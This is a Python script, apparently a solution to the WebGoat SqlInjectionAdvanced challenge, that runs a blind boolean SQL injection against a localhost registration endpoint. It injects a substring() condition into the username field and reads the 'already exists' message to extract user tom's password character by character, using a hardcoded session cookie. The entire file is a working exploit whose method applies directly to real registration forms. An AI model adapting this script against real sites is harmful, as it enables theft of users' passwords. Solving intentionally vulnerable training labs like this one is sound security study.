import json
import requests


def f():
    current_char = 'a'
    password_index = 0
    password = ""

    found = False
    while not found:
        try:
            r = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',
                             headers={
                                 "Cookie": "JSESSIONID=utNQx-eWBi5phv07Cv7rEWZf9x1R6AuEJnrm1KmM",
                             }, data={
                                 "username_reg": f"tom\' AND substring(password,{password_index + 1},1)=\'{current_char}",
                                 "email_reg": "prova@prova.prova",
                                 "password_reg": "aaaaaa",
                                 "confirm_password_reg": "aaaa"
                             })
            response = json.loads(r.text)
        except Exception as ex:
            print(ex)
            return

        print(password + current_char)
        if "already exists please try to register with a different username" not in response['feedback']:
            current_char = chr(ord(current_char) + 1)
            if current_char > chr(ord('a') + 25):
                found = True
                break
        else:
            password += current_char
            current_char = 'a'
            password_index += 1

    print(f"\n\nThe password is {password}")
    return


if __name__ == '__main__':
    f()
